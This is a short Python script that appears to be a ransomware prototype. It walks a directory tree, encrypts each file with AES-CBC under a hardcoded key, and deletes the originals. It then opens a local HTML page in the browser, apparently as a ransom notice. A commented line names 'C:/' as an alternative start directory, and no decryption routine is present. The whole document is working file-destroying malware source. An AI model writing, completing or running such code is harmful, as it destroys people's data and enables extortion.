from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import os
import webbrowser
import pathlib

def encrypt_file(input_file, output_file, key):

    iv = os.urandom(16)
    cipher = AES.new(key, AES.MODE_CBC, iv)

    with open(input_file, 'rb') as file_in, open(output_file, 'wb') as file_out:
        file_out.write(iv)

        fileRead = file_in.read()
        padded_fileRead = pad(fileRead, 16)
        cipherTxt = cipher.encrypt(padded_fileRead)
        file_out.write(cipherTxt)

def encrypt_dir(directory, key):
    for root, dirs, files in os.walk(directory):
        for file_name in files:
            input_file = os.path.join(root, file_name)
            output_file = os.path.join(root, f"encrypted_{file_name}")
            encrypt_file(input_file, output_file, key)
            os.remove(input_file)


#input_file = "simple.txt"
#output_file = "hidden.txt"
#startDir = "C:/"
startDir = "dir"
key = b'YourSecretKey123'

encrypt_dir(startDir, key)

html_page = "Page/index.html"
html_abs = os.path.abspath(html_page)
html_url = pathlib.Path(html_abs).as_uri()
webbrowser.open(html_url)

""" for filename in os.listdir(directory):
    if filename.endswith(".txt"):
        input_file = os.path.join(directory, filename)
        output_file = os.path.join(directory, f"Encrypted_{filename}")

        encrypt_file(input_file, output_file, key)
        os.remove(input_file) """